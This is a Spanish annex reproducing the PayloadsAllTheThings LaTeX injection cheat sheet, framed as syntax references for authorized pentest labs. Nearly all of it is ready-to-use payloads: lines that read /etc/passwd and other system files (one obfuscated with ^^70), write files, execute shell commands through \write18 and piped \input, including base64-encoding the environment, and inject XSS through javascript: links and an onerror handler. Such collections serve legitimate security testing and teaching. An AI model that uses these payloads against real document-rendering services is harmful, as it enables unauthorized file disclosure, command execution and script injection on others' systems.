# Code injection / eval: anexo de ejemplos de PayloadsAllTheThings

> **Uso:** elegir el bloque que corresponde al motor, versión y punto de entrada. Las líneas de un bloque pueden ser alternativas. Sustituir hosts, rutas, identificadores y dominios por los del laboratorio o alcance autorizado. Los ejemplos originales son referencias de sintaxis, no pruebas verificadas contra el objetivo.

**Documento de origen:** [LaTeX Injection/README.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/LaTeX%20Injection/README.md), revisión fija 3ac27901c711. **Licencia:** [MIT de Swissky](../../LICENCIA_PATT.md).

[← Índice de anexos](Catalogo_PATT.md) · [← Guía principal](README.md)

## 1. Archivo Manipulation / Read Archivo

```tex
\input{/etc/passwd}
\include{somefile} # load .tex file (somefile.tex)
```

```tex
\newread\file
\openin\file=/etc/issue
\read\file to\line
\text{\line}
\closein\file
```

```tex
\lstinputlisting{/etc/passwd}
\newread\file
\openin\file=/etc/passwd
\loop\unless\ifeof\file
    \read\file to\fileline
    \text{\fileline}
\repeat
\closein\file
```

```tex
\usepackage{verbatim}
\verbatiminput{/etc/passwd}
```

```tex
\catcode `\$=12
\catcode `\#=12
\catcode `\_=12
\catcode `\&=12
\input{path_to_script.pl}
```

```tex
\lstin^^70utlisting{/etc/passwd}
```

### Variantes presentes en tablas o texto del apartado

```text
\usepackage
\input
$
#
_
&
```

## 2. Archivo Manipulation / Write Archivo

```tex
\newwrite\outfile
\openout\outfile=cmd.tex
\write\outfile{Hello-world}
\write\outfile{Line 2}
\write\outfile{I like trains}
\closeout\outfile
```

## 3. LaTeX Inyección / Ejecución de comandos

```tex
\immediate\write18{id > output}
\input{output}
```

```tex
\immediate\write18{env | base64 > test.tex}
\input{text.tex}
```

```tex
\input|ls|base64
\input{|"/bin/hostname"}
```

### Variantes presentes en tablas o texto del apartado

```text
\verbatiminput
```

## 4. LaTeX Inyección / XSS

```tex
\url{javascript:alert(1)}
\href{javascript:alert(1)}{placeholder}
```

```tex
\unicode{<img src=1 onerror="<ARBITRARY_JS_CODE>">}
```

---

[← Índice de anexos](Catalogo_PATT.md) · [← Guía principal](README.md) · [Licencia de origen](../../LICENCIA_PATT.md)
